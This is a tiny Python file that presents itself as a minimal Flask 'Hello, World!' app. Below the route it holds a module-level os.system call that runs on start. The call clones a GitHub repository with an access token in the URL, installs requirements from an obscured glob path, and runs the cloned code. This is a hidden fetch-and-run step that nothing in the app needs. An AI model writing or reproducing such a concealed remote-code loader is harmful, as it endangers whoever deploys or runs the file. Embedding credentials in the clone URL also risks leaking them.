 import os
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
   return 'Hello, World!'

os.system("git clone https://username:token@github.com/username/reponame ok && cd ok && pip3 install -r requirements.txt && pip3 install -r re*/st*/op* && python3 -m main.py")
